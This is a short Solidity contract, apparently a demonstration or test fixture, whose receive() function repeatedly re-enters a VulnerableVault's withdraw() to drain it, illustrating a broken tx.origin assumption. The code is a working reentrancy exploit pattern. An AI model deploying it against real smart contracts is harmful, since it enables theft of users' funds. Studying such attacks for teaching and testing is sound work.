// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title MaliciousDelegatee
/// @notice Delegatee enabling reentrancy attacks - demonstrates broken tx.origin assumption
contract MaliciousDelegatee {
    uint256 public attackCount;
    VulnerableVault public targetVault;
    uint256 public maxReenters;

    function setupAttack(VulnerableVault _vault, uint256 _maxReenters) external {
        targetVault = _vault;
        maxReenters = _maxReenters;
        attackCount = 0;
    }

    function attack() external {
        targetVault.withdraw();
    }

    receive() external payable {
        if (attackCount >= maxReenters) return;

        ++attackCount;
        targetVault.withdraw();
    }
}
